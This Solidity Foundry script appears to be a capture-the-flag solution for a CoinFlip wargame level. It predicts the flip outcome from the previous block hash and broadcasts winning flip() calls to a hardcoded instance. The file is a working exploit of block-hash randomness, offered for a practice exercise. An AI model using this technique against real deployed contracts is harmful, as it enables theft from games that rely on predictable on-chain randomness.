//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../instances/Ilevel03.sol";

contract POC is Test {
    CoinFlip public level3 =
        CoinFlip(0x77503432Fcebc3b36E86eEee8650F30730797523);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function test() external {
        vm.startBroadcast();

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 lastHash;

        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side) {
            level3.flip(true);
        } else {
            level3.flip(false);
        }
        console.log("Consecutive Wins: ", level3.consecutiveWins());
        vm.stopBroadcast();
    }
}
